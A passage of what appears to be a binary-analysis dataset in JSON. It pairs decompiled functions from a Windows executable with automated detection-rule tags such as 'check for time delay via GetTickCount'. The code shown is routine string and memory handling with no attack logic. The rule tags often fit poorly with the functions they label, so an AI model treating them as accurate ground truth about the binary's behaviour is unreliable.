(puStack88 != auStack72) {\n        fcn.1400b64d0();\n    }\n    (**(*arg2 + 0x30))(&puStack88, arg2);\n    iVar1 = iStack80;\n    if (iStack80 + 1U < 0x3ffffffffffffffd) {\n        iVar4 = (iStack80 + 1U) * 2;\n        iVar5 = fcn.1400b64f0(iVar4);\n        fcn.14002a720(&puStack88, iVar5, iVar1, 0);\n        *(arg3 + 0x38) = iVar5;\n        *(iVar5 + -2 + iVar4) = 0;\n        *(arg3 + 0x40) = iVar1;\n        if (puStack88 != auStack72) {\n            fcn.1400b64d0();\n        }\n        (**(*arg2 + 0x38))(&puStack88, arg2);\n        if (iStack80 + 1U < 0x3ffffffffffffffd) {\n            iVar1 = (iStack80 + 1U) * 2;\n            iVar4 = fcn.1400b64f0(iVar1);\n            fcn.14002a720(&puStack88, iVar4, iStack80, 0);\n            *(arg3 + 0x48) = iVar4;\n            *(iVar4 + -2 + iVar1) = 0;\n            *(arg3 + 0x50) = iStack80;\n            if (puStack88 != auStack72) {\n                fcn.1400b64d0();\n            }\n            uVar3 = (**(*arg2 + 0x48))(arg2);\n            *(arg3 + 0x5c) = uVar3;\n            uVar3 = (**(*arg2 + 0x50))(arg2);\n            *(arg3 + 0x60) = uVar3;\n            return;\n        }\n        arg1 = fcn.1400b7660();\n    }\n    else {\n        arg1 = fcn.1400b7660();\n    }\n    do {\n        if (puStack88 != auStack72) {\n            fcn.1400b64d0();\n        }\n        arg1 = fcn.14000f000(arg1);\n    } while( true );\n}\n",
        "token_count": 1210
    },
    "14009fa4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14009fa40(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    int32_t **hSemaphore;\n    ulong *arg1_00;\n    int32_t **ppiVar4;\n    int32_t *piVar5;\n    \n    *arg1 = NULL;\n    fcn.14009ca10();\n    ppiVar2 = *0x140102d70;\n    ppiVar4 = *0x140102d30;\n    piVar1 = **0x140102d70;\n    *arg1 = piVar1;\n    if (piVar1 == *ppiVar4) {\n        return;\n    }\n    hSemaphore = fcn.14001a0a0();\n    piVar1 = *0x140102a70;\n    ppiVar4 = hSemaphore;\n    if (**0x140102a70 != 0) goto code_r0x00014009fae0;\n    piVar5 = *ppiVar2;\n    do {\n        *piVar5 = *piVar5 + 1;\n        while( true ) {\n            iVar3 = *piVar1;\n            *arg1 = piVar5;\n            if (iVar3 == 0) {\n                return;\n            }\n            iVar3 = fcn.14000eab0(hSemaphore);\n            if (iVar3 == 0) {\n                return;\n            }\n            arg1_00 = fcn.1400b6600(8);\n            *arg1_00 = 0x140109120;\n            ppiVar4 = fcn.1400b6bc0(arg1_00, 0x1401046e0, 0x14001bba0);\ncode_r0x00014009fae0:\n            iVar3 = fcn.14000ea40(ppiVar4);\n            if (iVar3 != 0) {\n                fcn.14001bf00();\n                fcn.14000f000(ppiVar4);\n                piVar1 = *ppiVar4;\n                if (piVar1 != *0x1400fb720) {\n                    if (**0x140102a70 == 0) {\n                        iVar3 = *piVar1;\n                        *piVar1 = iVar3 + -1;\n                    }\n                    else {\n                        LOCK();\n                        iVar3 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar3 == 1) {\n                        fcn.14009f4c0(piVar1);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n                        (*_sym.imp.msvcrt.dll_free)(piVar1);\n                        return;\n                    }\n                }\n                return;\n            }\n            piVar5 = *ppiVar2;\n            if (*piVar1 == 0) break;\n            LOCK();\n            *piVar5 = *piVar5 + 1;\n            piVar5 = *ppiVar2;\n        }\n    } while( true );\n}\n",
        "token_count": 683
    },
    "14009625": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t fcn.140096250(int64_t *arg1, int16_t *arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    iVar5 = 0;\n    if (0 < arg3) {\n        while( true ) {\n            iVar3 = arg1[2];\n            if (arg1[3] != iVar3) {\n                iVar4 = arg1[3] - iVar3 >> 1;\n                if (arg3 - iVar5 < iVar4) {\n                    iVar4 = arg3 - iVar5;\n                }\n                if (iVar4 != 0) {\n                    sub.msvcrt.dll_memcpy(arg2, iVar3, iVar4 * 2);\n                    iVar3 = arg1[2];\n                }\n                iVar5 = iVar5 + iVar4;\n                arg2 = arg2 + iVar4;\n                arg1[2] = iVar3 + iVar4 * 2;\n            }\n            if (arg3 <= iVar5) break;\n            pcVar1 = *(*arg1 + 0x50);\n            if (pcVar1 == 0x140096010) {\n                pcVar1 = *(*arg1 + 0x48);\n                if (pcVar1 == 0x140096600) {\n                    return iVar5;\n                }\n                iVar2 = (*pcVar1)(arg1);\n                if (iVar2 == -1) {\n                    return iVar5;\n                }\n                iVar2 = *arg1[2];\n                arg1[2] = arg1[2] + 1;\n            }\n            else {\n                iVar2 = (*pcVar1)(arg1);\n            }\n            if (iVar2 == -1) {\n                return iVar5;\n            }\n            iVar5 = iVar5 + 1;\n            *arg2 = iVar2;\n            arg2 = arg2 + 1;\n            if (arg3 <= iVar5) {\n                return iVar5;\n            }\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 452
    },
    "14009ae0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14009ae00(int64_t arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t arg3;\n    uint64_t arg3_00;\n    uint64_t arg3_01;\n    bool bVar4;\n    ushort uVar5;\n    uint uVar6;\n    int64_t *piVar7;\n    ulong uVar8;\n    char *arg2_00;\n    int64_t iVar9;\n    int64_t iStack112;\n    int64_t iStack104;\n    ulong uStack96;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piVar7 = fcn.1400b3520(arg2);\n    if (*(*piVar7 + 0x28) == 0x1400203b0) {\n        iVar9 = -2;\n        iVar3 = *(piVar7[2] + 0x28);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_wcslen(iVar3);\n            iVar9 = iVar3 + iVar9 * 2;\n        }\n        aiStack80[0] = fcn.14006c650(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar7 + 0x28))(aiStack80, piVar7);\n    }\n    arg3 = *(aiStack80[0] + -0x18);\n    if (arg3 < 0x3ffffffffffffffd) {\n        iStack112 = fcn.1400b64f0(arg3 * 2);\n        fcn.14001df50(aiStack80, iStack112, arg3, 0);\n        if (**0x140102a70 == 0) {\n            iVar2 = *(aiStack80[0] + -8);\n            *(aiStack80[0] + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = aiStack80[0] + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            fcn.14006ca90(aiStack80[0] + -0x18, &uStack81);\n        }\n        if (*(*piVar7 + 0x30) == 0x140020470) {\n            iVar9 = -2;\n            iVar3 = *(piVar7[2] + 0x38);\n            if (iVar3 != 0) {\n                iVar9 = sub.msvcrt.dll_wcslen(iVar3);\n                iVar9 = iVar3 + iVar9 * 2;\n            }\n            aiStack80[0] = fcn.14006c650(iVar3, iVar9);\n        }\n        else {\n            (**(*piVar7 + 0x30))(aiStack80, piVar7);\n        }\n        arg3_00 = *(aiStack80[0] + -0x18);\n        if (arg3_00 < 0x3ffffffffffffffd) {\n            iStack104 = fcn.1400b64f0(arg3_00 * 2);\n            fcn.14001df50(aiStack80, iStack104, arg3_00, 0);\n            if (**0x140102a70 == 0) {\n                iVar2 = *(aiStack80[0] + -8);\n                *(aiStack80[0] + -8) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = aiStack80[0] + -8;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                fcn.14006ca90(aiStack80[0] + -0x18, &uStack81);\n            }\n            if (*(*piVar7 + 0x38) == 0x140020420) {\n                iVar9 = -2;\n                iVar3 = *(piVar7[2] + 0x48);\n                if (iVar3 != 0) {\n                    iVar9 = sub.msvcrt.dll_wcslen(iVar3);\n                    iVar9 = iVar3 + iVar9 * 2;\n                }\n                aiStack80[0] = fcn.14006c650(iVar3, iVar9);\n            }\n            else {\n                (**(*piVar7 + 0x38))(aiStack80, piVar7);\n            }\n            arg3_01 = *(aiStack80[0] + -0x18);\n            if (arg3_01 < 0x3ffffffffffffffd) {\n                uVar8 = fcn.1400b64f0(arg3_01 * 2);\n                fcn.14001df50(aiStack80, uVar8, arg3_01, 0);\n                if (**0x140102a70 == 0) {\n                    iVar2 = *(aiStack80[0] + -8);\n                    *(aiStack80[0] + -8) = iVar2 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = aiStack80[0] + -8;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar2 < 1) {\n                    fcn.14006ca90(aiStack80[0] + -0x18, &uStack81);\n                }\n                if (*(*piVar7 + 0x20) == 0x1400201d0) {\n                    iVar9 = -1;\n                    iVar3 = *(piVar7[2] + 0x10);\n                    if (iVar3 != 0) {\n                        iVar9 = sub.msvcrt.dll_strlen(iVar3);\n                        iVar9 = iVar3 + iVar9;\n                    }\n                    aiStack80[0] = fcn.140075b60(iVar3, iVar9);\n                }\n                else {\n                    (**(*piVar7 + 0x20))(aiStack80, piVar7);\n                }\n                iVar9 = *(aiStack80[0] + -0x18);\n                arg2_00 = fcn.1400b64f0(iVar9);\n                fcn.14001efe0(aiStack80, arg2_00, iVar9, 0);\n                *(arg1 + 0x10) = arg2_00;\n                bVar4 = false;\n                *(arg1 + 0x18) = iVar9;\n                if (iVar9 != 0) {\n                    bVar4 = *arg2_00 - 1U < 0x7e;\n                }\n                iVar9 = *piVar7;\n                *(arg1 + 0x20) = bVar4;\n                if (*(iVar9 + 0x10) == 0x140020410) {\n                    uVar5 = *(piVar7[2] + 0x22);\n                }\n                else {\n                    uVar5 = (**(iVar9 + 0x10))(piVar7);\n                    iVar9 = *piVar7;\n                }\n                *(arg1 + 0x22) = uVar5;\n                if (*(iVar9 + 0x18) == 0x1400204c0) {\n                    uVar5 = *(piVar7[2] + 0x24);\n                }\n                else {\n                    uVar5 = (**(iVar9 + 0x18))(piVar7);\n                    iVar9 = *piVar7;\n                }\n                *(arg1 + 0x24) = uVar5;\n                *(arg1 + 0x30) = arg3;\n                *(arg1 + 0x28) = iStack112;\n                *(arg1 + 0x40) = arg3_00;\n                *(arg1 + 0x38) = iStack104;\n                *(arg1 + 0x50) = arg3_01;\n                *(arg1 + 0x48) = uVar8;\n                if (*(iVar9 + 0x40) == 0x140020400) {\n                    uVar6 = *(piVar7[2] + 0x58);\n                }\n                else {\n                    uVar6 = (**(iVar9 + 0x40))(piVar7);\n                    iVar9 = *piVar7;\n                }\n                *(arg1 + 0x58) = uVar6;\n                if (*(iVar9 + 0x48) == 0x140020290) {\n                    uVar6 = *(piVar7[2] + 0x5c);\n                }\n                else {\n                    uVar6 = (**(iVar9 + 0x48))(piVar7);\n                }\n                *(arg1 + 0x5c) = uVar6;\n                if (*(*piVar7 + 0x50) == 0x140020280) {\n                    uVar6 = *(piVar7[2] + 0x60);\n                }\n                else {\n                    uVar6 = (**(*piVar7 + 0x50))(piVar7);\n                }\n                *(arg1 + 0x60) = uVar6;\n                piVar7 = fcn.1400b3700(arg2);\n                (**(*piVar7 + 0x58))(piVar7, **0x140102bd0, **0x140102bd0 + 0xb, arg1 + 100);\n                piVar1 = *0x140102a70;\n                *(arg1 + 0x7a) = 1;\n                if (*piVar1 == 0) {\n                    iVar2 = *(aiStack80[0] + -8);\n                    *(aiStack80[0] + -8) = iVar2 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = aiStack80[0] + -8;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar2 < 1) {\n                    fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n                }\n                return;\n            }\n            uVar8 = fcn.1400b7660();\n            fcn.1400b64c0(iStack104);\n            goto code_r0x00014009b352;\n        }\n    }\n    else {\n        fcn.1400b7660();\n    }\n    uVar8 = fcn.1400b7660();\ncode_r0x00014009b352:\n    do {\n        fcn.1400b64c0(iStack112);\n        do {\n            uVar8 = fcn.14000f000(uVar8);\n            fcn.140075fa0(aiStack80[0] + -0x18);\n            fcn.1400b64c0(uStack96);\n            if (iStack104 != 0) {\n                fcn.1400b64c0(iStack104);\n            }\n        } while (iStack112 == 0);\n    } while( true );\n}\n",
        "token_count": 2443
    },
    "14009b62": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14009b620(int64_t arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t arg3;\n    uint64_t arg3_00;\n    uint64_t arg3_01;\n    bool bVar4;\n    ushort uVar5;\n    uint uVar6;\n    int64_t *piVar7;\n    ulong uVar8;\n    char *arg2_00;\n    int64_t iVar9;\n    int64_t iStack112;\n    int64_t iStack104;\n    ulong uStack96;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piVar7 = fcn.1400b3580(arg2);\n    if (*(*piVar7 + 0x28) == 0x1400207f0) {\n        iVar9 = -2;\n        iVar3 = *(piVar7[2] + 0x28);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_wcslen(iVar3);\n            iVar9 = iVar3 + iVar9 * 2;\n        }\n        aiStack80[0] = fcn.14006c650(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar7 + 0x28))(aiStack80, piVar7);\n    }\n    arg3 = *(aiStack80[0] + -0x18);\n    if (arg3 < 0x3ffffffffffffffd) {\n        iStack112 = fcn.1400b64f0(arg3 * 2);\n        fcn.14001df50(aiStack80, iStack112, arg3, 0);\n        if (**0x140102a70 == 0) {\n            iVar2 = *(aiStack80[0] + -8);\n            *(aiStack80[0] + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = aiStack80[0] + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            fcn.14006ca90(aiStack80[0] + -0x18, &uStack81);\n        }\n        if (*(*piVar7 + 0x30) == 0x1400208b0) {\n            iVar9 = -2;\n            iVar3 = *(piVar7[2] + 0x38);\n            if (iVar3 != 0) {\n                iVar9 = sub.msvcrt.dll_wcslen(iVar3);\n                iVar9 = iVar3 + iVar9 * 2;\n            }\n            aiStack80[0] = fcn.14006c650(iVar3, iVar9);\n        }\n        else {\n            (**(*piVar7 + 0x30))(aiStack80, piVar7);\n        }\n        arg3_00 = *(aiStack80[0] + -0x18);\n        if (arg3_00 < 0x3ffffffffffffffd) {\n            iStack104 = fcn.1400b64f0(arg3_00 * 2);\n            fcn.14001df50(aiStack80, iStack104, arg3_00, 0);\n            if (**0x140102a70 == 0) {\n                iVar2 = *(aiStack80[0] + -8);\n                *(aiStack80[0] + -8) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = aiStack80[0] + -8;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                fcn.14006ca90(aiStack80[0] + -0x18, &uStack81);\n            }\n            if (*(*piVar7 + 0x38) == 0x140020860) {\n                iVar9 = -2;\n                iVar3 = *(piVar7[2] + 0x48);\n                if (iVar3 != 0) {\n                    iVar9 = sub.msvcrt.dll_wcslen(iVar3);\n                    iVar9 = iVar3 + iVar9 * 2;\n                }\n                aiStack80[0] = fcn.14006c650(iVar3, iVar9);\n            }\n            else {\n                (**(*piVar7 + 0x38))(aiStack80, piVar7);\n            }\n            arg3_01 = *(aiStack80[0] + -0x18);\n            if (arg3_01 < 0x3ffffffffffffffd) {\n                uVar8 = fcn.1400b64f0(arg3_01 * 2);\n                fcn.14001df50(aiStack80, uVar8, arg3_01, 0);\n                if (**0x140102a70 == 0) {\n                    iVar2 = *(aiStack80[0] + -8);\n                    *(aiStack80[0] + -8) = iVar2 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = aiStack80[0] + -8;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar2 < 1) {\n                    fcn.14006ca90(aiStack80[0] + -0x18, &uStack81);\n                }\n                if (*(*piVar7 + 0x20) == 0x140020610) {\n                    iVar9 = -1;\n                    iVar3 = *(piVar7[2] + 0x10);\n                    if (iVar3 != 0) {\n                        iVar9 = sub.msvcrt.dll_strlen(iVar3);\n                        iVar9 = iVar3 + iVar9;\n                    }\n                    aiStack80[0] = fcn.140075b60(iVar3, iVar9);\n                }\n                else {\n                    (**(*piVar7 + 0x20))(aiStack80, piVar7);\n                }\n                iVar9 = *(aiStack80[0] + -0x18);\n                arg2_00 = fcn.1400b64f0(iVar9);\n                fcn.14001efe0(aiStack80, arg2_00, iVar9, 0);\n                *(arg1 + 0x10) = arg2_00;\n                bVar4 = false;\n                *(arg1 + 0x18) = iVar9;\n                if (iVar9 != 0) {\n                    bVar4 = *arg2_00 - 1U < 0x7e;\n                }\n                iVar9 = *piVar7;\n                *(arg1 + 0x20) = bVar4;\n                if (*(iVar9 + 0x10) == 0x140020850) {\n                    uVar5 = *(piVar7[2] + 0x22);\n                }\n                else {\n                    uVar5 = (**(iVar9 + 0x10))(piVar7);\n                    iVar9 = *piVar7;\n                }\n                *(arg1 + 0x22) = uVar5;\n                if (*(iVar9 + 0x18) == 0x140020900) {\n                    uVar5 = *(piVar7[2] + 0x24);\n                }\n                else {\n                    uVar5 = (**(iVar9 + 0x18))(piVar7);\n                    iVar9 = *piVar7;\n                }\n                *(arg1 + 0x24) = uVar5;\n                *(arg1 + 0x30) = arg3;\n                *(arg1 + 0x28) = iStack112;\n                *(arg1 + 0x40) = arg3_00;\n                *(arg1 + 0x38) = iStack104;\n                *(arg1 + 0x50) = arg3_01;\n                *(arg1 + 0x48) = uVar8;\n                if (*(iVar9 + 0x40) == 0x140020840) {\n                    uVar6 = *(piVar7[2] + 0x58);\n                }\n                else {\n                    uVar6 = (**(iVar9 + 0x40))(piVar7);\n                    iVar9 = *piVar7;\n                }\n                *(arg1 + 0x58) = uVar6;\n                if (*(iVar9 + 0x48) == 0x1400206d0) {\n                    uVar6 = *(piVar7[2] + 0x5c);\n                }\n                else {\n                    uVar6 = (**(iVar9 + 0x48))(piVar7);\n                }\n                *(arg1 + 0x5c) = uVar6;\n                if (*(*piVar7 + 0x50) == 0x1400206c0) {\n                    uVar6 = *(piVar7[2] + 0x60);\n                }\n                else {\n                    uVar6 = (**(*piVar7 + 0x50))(piVar7);\n                }\n                *(arg1 + 0x60) = uVar6;\n                piVar7 = fcn.1400b3700(arg2);\n                (**(*piVar7 + 0x58))(piVar7, **0x140102bd0, **0x140102bd0 + 0xb, arg1 + 100);\n                piVar1 = *0x140102a70;\n                *(arg1 + 0x7a) = 1;\n                if (*piVar1 == 0) {\n                    iVar2 = *(aiStack80[0] + -8);\n                    *(aiStack80[0] + -8) = iVar2 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = aiStack80[0] + -8;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar2 < 1) {\n                    fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n                }\n                return;\n            }\n            uVar8 = fcn.1400b7660();\n            fcn.1400b64c0(iStack104);\n            goto code_r0x00014009bb72;\n        }\n    }\n    else {\n        fcn.1400b7660();\n    }\n    uVar8 = fcn.1400b7660();\ncode_r0x00014009bb72:\n    do {\n        fcn.1400b64c0(iStack112);\n        do {\n            uVar8 = fcn.14000f000(uVar8);\n            fcn.140075fa0(aiStack80[0] + -0x18);\n            fcn.1400b64c0(uStack96);\n            if (iStack104 != 0) {\n                fcn.1400b64c0(iStack104);\n            }\n        } while (iStack112 == 0);\n    } while( true );\n}\n",
        "token_count": 2445
    },
    "1400a266": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400a2660(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t arg2_00;\n    \n    arg2_00 = arg1[1];\n    if (arg2 <= arg2_00) {\n        if (arg2 < arg2_00) {\n            arg1[1] = arg2;\n            *(*arg1 + arg2) = 0;\n        }\n        return;\n    }\n    fcn.1400a1690(arg1, arg2_00, 0, arg2 - arg2_00);\n    return;\n}\n",
        "token_count": 130
    },
    "1400a2ed": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1400a2ed0(int64_t **arg1)\n\n{\n    int64_t **ppiVar1;\n    int64_t *piVar2;\n    uint32_t uVar3;\n    int64_t *piVar4;\n    int64_t **ppiVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    \n    ppiVar5 = *arg1;\n    ppiVar1 = arg1 + 2;\n    if (ppiVar5 == ppiVar1) {\n        return;\n    }\n    piVar2 = arg1[1];\n    if (piVar2 < 0x10) {\n        uVar8 = piVar2 + 1;\n        uVar3 = uVar8;\n        if (piVar2 == NULL) {\n            *(arg1 + 2) = *ppiVar5;\n            goto code_r0x0001400a2f30;\n        }\n        if (7 < uVar3) {\n            arg1[2] = *ppiVar5;\n            *(arg1 + (uVar8 & 0xffffffff) + 8) = *(ppiVar5 + ((uVar8 & 0xffffffff) - 8));\n            iVar7 = ppiVar1 - (arg1 + 3 & 0xfffffffffffffff8);\n            uVar3 = uVar3 + iVar7 & 0xfffffff8;\n            if (7 < uVar3) {\n                uVar6 = 0;\n                do {\n                    uVar8 = uVar6;\n                    uVar6 = uVar6 + 8;\n                    *((arg1 + 3 & 0xfffffffffffffff8) + uVar8) = *(ppiVar5 + (uVar8 - iVar7));\n                } while (uVar6 < uVar3);\n            }\n            goto code_r0x0001400a2f30;\n        }\n        if ((uVar8 & 4) == 0) {\n            if ((uVar3 != 0) && (*(arg1 + 2) = *ppiVar5,  (uVar8 & 2) != 0)) {\n                *(arg1 + (uVar8 & 0xffffffff) + 0xe) = *(ppiVar5 + ((uVar8 & 0xffffffff) - 2));\n            }\n            goto code_r0x0001400a2f30;\n        }\n    }\n    else {\n        if (arg1[2] <= piVar2) {\n            return;\n        }\n        iVar7 = piVar2 + 1;\n        if (-1 < iVar7) {\n            piVar4 = fcn.1400b6520(iVar7);\n            ppiVar5 = *arg1;\n            sub.msvcrt.dll_memcpy(piVar4, ppiVar5, iVar7);\n            if (ppiVar1 != ppiVar5) {\n                fcn.1400b64d0(ppiVar5);\n            }\n            *arg1 = piVar4;\n            arg1[2] = piVar2;\n            return;\n        }\n        uVar3 = fcn.1400b6f80();\n    }\n    *(arg1 + 2) = *ppiVar5;\n    *(arg1 + uVar3 + 0xc) = *(ppiVar5 + (uVar3 - 4));\ncode_r0x0001400a2f30:\n    fcn.1400b64d0();\n    *arg1 = ppiVar1;\n    return;\n}\n",
        "token_count": 763
    },
    "1400a307": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400a3070(ulong *arg1, uint64_t arg2)\n\n{\n    ulong *puVar1;\n    uchar *puVar2;\n    uint64_t arg3;\n    uint64_t auStackX16 [3];\n    \n    if (arg1 + 2 == *arg1) {\n        arg3 = 0xf;\n    }\n    else {\n        arg3 = arg1[2];\n    }\n    if (arg2 <= arg3) {\n        return;\n    }\n    auStackX16[0] = arg2;\n    puVar2 = fcn.1400a3300(arg1, auStackX16, arg3);\n    puVar1 = *arg1;\n    if (arg1[1] == 0) {\n        *puVar2 = *puVar1;\n    }\n    else if (arg1[1] != -1) {\n        sub.msvcrt.dll_memcpy(puVar2, puVar1);\n    }\n    if (arg1 + 2 != puVar1) {\n        fcn.1400b64d0(puVar1);\n    }\n    *arg1 = puVar2;\n    arg1[2] = auStackX16[0];\n    return;\n}\n",
        "token_count": 270
    },
    "1400a330": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong * fcn.1400a3300(ulong noname_0, uint64_t *arg2, uint64_t arg3)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    ulong arg2_00;\n    ulong uVar3;\n    char cVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    code *pcVar7;\n    int64_t *piVar8;\n    int64_t **ppiVar9;\n    ulong arg1;\n    uint64_t uVar10;\n    ulong *puVar11;\n    int64_t iVar12;\n    uchar auStack288 [16];\n    ulong uStack272;\n    int64_t *piStack240;\n    \n    uVar10 = *arg2;\n    if (0x3fffffffffffffff < uVar10) {\n        iVar12 = 0x1400fe8c0;\n        puVar6 = fcn.1400b7170(0x1400fe8c0);\n        *(iVar12 + 8) = arg2;\n        return puVar6;\n    }\n    iVar12 = uVar10 + 1;\n    if ((arg3 < uVar10) && (arg3 = arg3 * 2,  uVar10 < arg3)) {\n        if (arg3 < 0x4000000000000000) {\n            iVar12 = arg3 + 1;\n            *arg2 = arg3;\n        }\n        else {\n            iVar12 = 0x4000000000000000;\n            *arg2 = 0x3fffffffffffffff;\n        }\n    }\n    iVar5 = 1;\n    if (iVar12 != 0) {\n        iVar5 = iVar12;\n    }\n    while( true ) {\n        puVar6 = sub.msvcrt.dll_malloc(iVar5);\n        if (puVar6 != NULL) {\n            return puVar6;\n        }\n        pcVar7 = fcn.1400b05d0();\n        if (pcVar7 == NULL) break;\n        (*pcVar7)();\n    }\n    piVar8 = fcn.1400b6600(8);\n    *piVar8 = *0x140103570 + 0x10;\n    fcn.1400b6bc0(piVar8, 0x1401063b0, fcn.1400ae670);\n    puVar6 = sub.msvcrt.dll_malloc(0x90);\n    if (puVar6 == NULL) {\n        iVar12 = 0x90;\n        puVar6 = fcn.14001a310(0x90);\n        if (puVar6 == NULL) {\n            fcn.1400b2e40();\n            piVar8 = iVar12 + 0xa0;\n            puVar6 = sub.msvcrt.dll_malloc();\n            if ((puVar6 != NULL) || (puVar6 = fcn.14001a310(piVar8),  puVar6 != NULL)) {\n                *puVar6 = 0;\n                puVar6[0x13] = 0;\n                puVar11 = puVar6 + 1 & 0xfffffffffffffff8;\n                for (uVar10 = (puVar6 - (puVar6 + 1 & 0xfffffffffffffff8)) + 0xa0U >> 3; uVar10 != 0;\n                    uVar10 = uVar10 - 1) {\n                    *puVar11 = 0;\n                    puVar11 = puVar11 + 1;\n                }\n                return puVar6 + 0x14;\n            }\n            fcn.1400b2e40();\n            ppiVar9 = fcn.1400b6970();\n            piVar1 = piVar8 + -10;\n            piStack240 = *ppiVar9;\n            if (*piVar8 + 0xb8b1aabcbcd4d500U < 2) {\n                iVar2 = *(piVar8 + -5);\n                if (iVar2 < 0) {\n                    iVar2 = -iVar2;\n                }\n                *(piVar8 + -5) = iVar2 + 1;\n                *(ppiVar9 + 1) = *(ppiVar9 + 1) + -1;\n                if (piStack240 != piVar1) {\n                    piVar8[-6] = piStack240;\n                    *ppiVar9 = piVar1;\n                }\n                return piVar8[-1];\n            }\n            if (piStack240 == NULL) {\n                *ppiVar9 = piVar1;\n                return NULL;\n            }\n            fcn.1400b2e40();\n            if ((piStack240 == NULL) || (fcn.1400b6670(piStack240),  1 < *piStack240 + 0xb8b1aabcbcd4d500U)) {\n                fcn.1400b2e40();\n            }\n            iVar12 = piStack240[-7];\n            fcn.140019910();\n            fcn.1400b6670(iVar12);\n            uStack272 = *(iVar12 + -0x10);\n            arg2_00 = *(iVar12 + -0x18);\n            iVar2 = *(iVar12 + -0x24);\n            uVar3 = *(iVar12 + -0x38);\n            arg1 = fcn.140019930(*(iVar12 + -0x40));\n            fcn.1400b6670(arg1);\n            piVar8 = fcn.1400b6980();\n            puVar6 = *piVar8;\n            if ((*(puVar6 + 10) & 1) == 0) goto code_r0x0001400b67ea;\n            puVar6 = *puVar6;\n            while( true ) {\n                fcn.140019500(0, arg2_00, auStack288);\n                cVar4 = fcn.1400195f0(auStack288, puVar6[-0x12], puVar6, iVar2);\n                if (cVar4 != '\\0') break;\n                puVar6 = 0x140105740;\n                cVar4 = fcn.1400195f0(auStack288, 0x140105740, 0, iVar2);\n                if (cVar4 == '\\0') goto code_r0x0001400b680d;\n                piVar8 = fcn.1400b6600(8);\n                *piVar8 = *0x1401032a0 + 0x10;\n                fcn.1400b6bc0(piVar8, 0x140105740, 0x140083310);\ncode_r0x0001400b67ea:\n                puVar6 = puVar6 + 0x12;\n            }\n            fcn.1400b6b70();\ncode_r0x0001400b680d:\n            fcn.140019910(uVar3);\n            ppiVar9 = fcn.1400b6970();\n            piVar8 = *ppiVar9;\n            if (piVar8 != NULL) {\n                if ((*(piVar8 + 10) & 1) != 0) {\n                    piVar8 = *piVar8 + -0x90;\n                }\n                piVar8 = *piVar8;\n            }\n            return piVar8;\n        }\n    }\n    *puVar6 = 0;\n    puVar6[0x11] = 0;\n    puVar11 = puVar6 + 1 & 0xfffffffffffffff8;\n    for (uVar10 = (puVar6 - 